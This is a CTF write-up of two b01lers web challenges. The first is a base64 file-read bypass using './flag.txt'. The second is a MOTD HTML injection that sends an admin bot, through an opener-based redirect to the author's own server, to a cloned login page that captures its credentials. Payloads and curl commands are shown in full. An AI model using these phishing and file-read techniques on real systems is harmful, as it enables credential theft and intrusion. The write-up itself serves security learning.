### Summary

Cause I was lazy, I didn't do ctf for a long time. If i say "cause I was busy", it looks fucking stupid. When I'm solving, the time of ctf is only 5 hours, so i just decided to solve the web challenge

---
### warmup 100 Points

```plaintext
My first flask app, I hope you like it
http://ctf.b01lers.com:5115
Author: CygnusX
```
the description is as above

```zsh
❯ curl -i http://ctf.b01lers.com:5115/aW5kZXguaHRtbA\=\=
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.8.16
Date: Mon, 20 Mar 2023 03:14:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 337
Connection: close

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My first flask app</title>
</head>
<body>
    <h1>Hello World!</h1>
</body>
<script>
    console.log("")
</script>
<!-- debug.html -->
</html>
~
❯
```
I got the result of curl as above. there is comment called "debug.html".

```zsh
❯ curl -i http://ctf.b01lers.com:5115/debug.html
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: Werkzeug/2.2.3 Python/3.8.16
Date: Mon, 20 Mar 2023 03:16:30 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 265
Connection: close

<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

~
❯
```
But an error occured when I'm executing a command like this. If you check an url when you connected first, file name sent in base64. so if we wanna connect to debug.html, we have to connect to `ZGVidWcuaHRtbA==`.

```zsh
❯ curl -i http://ctf.b01lers.com:5115/ZGVidWcuaHRtbA==
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.8.16
Date: Mon, 20 Mar 2023 03:20:59 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 278
Connection: close

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>debug</title>
</head>
<body>
    testing rendering for flask app.py
</body>
</html>
~
❯
```
Finally we got the result of it like this and then we're gotta check an app.py now.

```python
from base64 import b64decode
import flask

app = flask.Flask(__name__)

@app.route('/<name>')
def index2(name):
    name = b64decode(name)
    if (validate(name)):
        return "This file is blocked!"
    try:
        file = open(name, 'r').read()
    except:
        return "File Not Found"
    return file

@app.route('/')
def index():
    return flask.redirect('/aW5kZXguaHRtbA==')

def validate(data):
    if data == b'flag.txt':
        return True
    return False


if __name__ == '__main__':
    app.run()
```
I got the code of app.py via filename called `YXBwLnB5`. we can know that the flag is in flag.txt via code but server is blocking the character called flag.txt but it doesn't matter because we can bypass via the current path mark like `./flag.txt`

```zsh
❯ curl -i http://ctf.b01lers.com:5115/Li9mbGFnLnR4dA==
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.8.16
Date: Mon, 20 Mar 2023 03:26:05 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 45
Connection: close

bctf{h4d_fun_w1th_my_l4st_m1nut3_w4rmuP????!}
~
❯
```

---
### fishy-motd 263 Points

```plaintext
I just created a tool to deploy messages to server admins in our company. They *love* clicking on them too!
http://ctf.b01lers.com:5110
Author: 0xMihir
```
the description is as above

```javascript
import fastify from 'fastify';
import fastifyFormbody from '@fastify/formbody';
import fastifyStatic from '@fastify/static';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import puppeteer from 'puppeteer';
import { nanoid } from 'nanoid';

let messages = {}

const server = fastify();

server.register(fastifyFormbody);
server.register(fastifyStatic, {
    root: path.join(path.dirname(fileURLToPath(import.meta.url)), 'public'),
    prefix: '/public/'
});

const flag = process.env.FLAG || 'flag{fake_flag}';
const port = 5000;
const user = process.env.ADMIN_USER || 'admin';
const pass = process.env.ADMIN_PASS || 'pass';

server.get('/', (req, res) => {
    res.sendFile('index.html')
});

server.get('/style.css', (req, res) => {
    res.sendFile('style.css')
});

server.get('/login', (req, res) => {
    const id = req.query.motd;
    if (!id) {
        fs.readFile('./login.html', 'utf8', (err, data) => {
            if (err) {
                console.log(err);
                res.status(500).send('Internal server error, please open a ticket');
            }
            else {
                res.type('text/html').send(data.toString().replace('{{motd}}', 'Welcome to the server!'));
            }
        });
    }
    else {
        if (id in messages) {
            fs.readFile('./login.html', 'utf8', (err, data) => {
                if (err) {
                    console.log(err);
                    res.status(500).send('Internal server error, please open a ticket');
                }
                else {
                    res.type('text/html').send(data.toString().replace('{{motd}}', messages[id]));
                }
            });
        } else {
            res.send('MOTD not found');
        }
    }
});

server.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    if (username === user && password === pass) {
        res.send(flag);
    }
    else {
        res.send('Incorrect username or password');
    }
});

server.get('/start', async (req, res) => {
    const id = req.query.motd;
    if (id && id in messages) {
        try {
            const result = await adminBot(id);
            if (result.error) {
                res.send(result.error)
            } else {
                res.send('Hope everyone liked your message!')
            }
        } catch (err) {
            console.log(err);
            res.send('Something went wrong, please open a ticket');
        }
    } else {
        res.send('MOTD not found');
    }
});

server.post('/motd', (req, res) => {
    const motd = req.body.motd;
    const id = nanoid();
    messages[id] = motd;
    fs.readFile('./motd.html', 'utf8', (err, data) => {
        if (err) {
            console.log(err);
            res.status(500).send('Internal server error, please open a ticket');
        }
        else {
            res.type('text/html').send(data.toString().replaceAll('{{id}}', id));
        }
    });
})

server.get('/motd', (req, res) => {
    res.send('Please use the form to submit a message of the day.');
});

const adminBot = async (id) => {
    const browser = await puppeteer.launch({
        headless: true, // Uncomment below if the sandbox is causing issues
        // args: ['--no-sandbox', '--disable-setuid-sandbox', '--single-process']
    })
    const page = await browser.newPage();
    await page.setViewport({ width: 800, height: 600 });
    const url = `http://localhost:${port}/login?motd=${id}`;
    await page.goto(url);
    await page.mouse.click(10, 10);
    await new Promise(r => setTimeout(r, 1000));
    try {
        if (url !== await page.evaluate(() => window.location.href)) {
            return { error: "Hey! Something's fishy here!" };
        }
    } catch (err) {
        return { error: "Hey! Something's fishy here!" };
    }
    await new Promise(r => setTimeout(r, 5000));
    await page.mouse.click(420, 280);
    await page.keyboard.type(user);
    await page.mouse.click(420, 320);
    await page.keyboard.type(pass);
    await page.mouse.click(420, 360);
    await new Promise(r => setTimeout(r, 1000));
    await browser.close();
    messages[id] = undefined;
    return { error: null };
}

server.listen({ port, host: '0.0.0.0' }, (err, address) => {
    if (err) {
        console.error(err);
        process.exit(1);
    }
    console.log(`Server listening at ${address}`);
});
```
the condition of get a flag is log-in with an account of admin but we can't log in normally because we can't know an account of admin. but there is admin bot. the admin bot clicks specific coordinates, inputs the admin's ID and password, and logs in.

Also, in the login page, we can insert the motd value we created, and HTML code can be inserted via this logic.

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; form-action 'self'" />
```
on the login page, CSP is set as above. the script can't be executed because default-src is none. also, since form-src is self, even if an arbitrary form tag is added, data is not received by the personal server.

```javascript
    await page.mouse.click(10, 10);

// (skip)
    await new Promise(r => setTimeout(r, 5000));
    await page.mouse.click(420, 280);
    await page.keyboard.type(user);
    await page.mouse.click(420, 320);
    await page.keyboard.type(pass);
    await page.mouse.click(420, 360);
```
but here's the strange part. The admin bot clicks once on coordinates (10,10). after that, click the coordinates (10, 10) above, and after 5 seconds, enter the account of admin in the login form and log in.

If we insert a personal server link at coordinates (10, 10) using the a tag, the admin bot will click the link and move to the personal server. Since there is an interval of 5 seconds here, it is enough time for all pages to be rendered.

Copy the login.html file, upload it to the personal server, and move the admin bot here to induce the admin account information to be transmitted to the personal server.

![](https://media.discordapp.net/attachments/962997469757702177/1087221071025012787/2023-03-20_12.48.14.png?width=1462&height=938)

I created login.html on my personal server as above.

```javascript
    try {
        if (url !== await page.evaluate(() => window.location.href)) {
            return { error: "Hey! Something's fishy here!" };
        }
    } catch (err) {
        return { error: "Hey! Something's fishy here!" };
    }
```
but in the admim bot, the logic to check the current origin is added as above. So we shouldn't go to the current page via the private server link. Open the private server in a new window using the blank option, and stay on the origin of the admin server for 1 second. but in this case, the personal server opens in a new window, so the log-in logic is just done on the problem server.

but we can use the `opener` object to redirect an existing window to a desired location. Since the `opener` object points to the window at the existing window that opened itself, the existing window can also be redirected to the private server by using opener.location.href on the private server.

```html
<!-- https://pocas.kr/re.html -->
<script>
    setTimeout(() => {opener.location.href='/login.html'}, 2000)
</script>
```
So I uploaded the redirect file as above

```html
<a href="http://pocas.kr/re.html" target="_blank" rel="opener">CSRF</a>
```
Now, create motd using the above payload and pass it to the manager bot.

![](https://media.discordapp.net/attachments/962997469757702177/1087227394970095636/2023-03-20_13.13.22.png?width=1986&height=362)

finally account is sent to my server

```zsh
❯ curl -X POST http://ctf.b01lers.com:5110/login -d "username=n01_5y54dm1n&password=7zzHuXRAp)uj@(qO@Zi0"
bctf{ph15h1ng_reel_w1th_0n3_e}
~
❯
```
